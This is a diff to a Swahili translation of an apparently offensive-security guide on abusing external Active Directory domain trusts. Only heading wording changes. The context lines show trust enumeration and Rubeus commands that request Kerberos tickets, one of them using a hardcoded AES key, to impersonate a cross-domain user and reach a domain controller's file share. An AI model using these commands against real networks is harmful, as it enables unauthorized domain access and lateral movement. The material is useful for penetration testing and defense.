@@ -6,7 +6,7 @@ Katika hali hii, kikoa cha nje kinakuamini (au vyote vinajiamini), hivyo unaweza
 
 ## Enumeration
 
-Kwanza kabisa, unahitaji **kuhesabu** **imani**:
+Kwanza kabisa, unahitaji **kuorodhesha** **imani**:
 ```bash
 Get-DomainTrust
 SourceName      : a.domain.local   --> Current domain
@@ -102,7 +102,7 @@ Rubeus.exe asktgs /service:cifs/dc.doamin.external /domain:dc.domain.external /d
 
 # Now you have a TGS to access the CIFS service of the domain controller
 ```
-### Njia kamili ya kujifanya mtumiaji
+### Njia kamili ya kujifanya kuwa mtumiaji
 ```bash
 # Get a TGT of the user with cross-domain permissions
 Rubeus.exe asktgt /user:crossuser /domain:sub.domain.local /aes256:70a673fa756d60241bd74ca64498701dbb0ef9c5fa3a93fe4918910691647d80 /opsec /nowrap
